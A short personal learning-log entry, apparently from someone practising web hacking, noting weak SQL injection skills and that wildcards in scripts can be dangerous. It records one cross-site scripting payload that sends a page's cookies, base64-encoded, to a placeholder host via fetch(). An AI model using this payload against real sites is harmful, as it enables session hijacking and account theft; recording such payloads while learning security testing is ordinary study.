So today I stoal my first cookies&#x2026; yeah, this is something I need to remember:
</p>

<p>
<code>&lt;script&gt;fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );&lt;/script&gt;</code>
</p>

<p>
Nevertheles I was directly humbled afterwards as I have seen that the SQLi basics are definetly not that good on my side and that
without SQLmap I'm quite helpless.
</p>

<p>
Furthermore I discoverd that even wildcards can be quite dangerous in script
Unbeliveable what you have to avoid :)
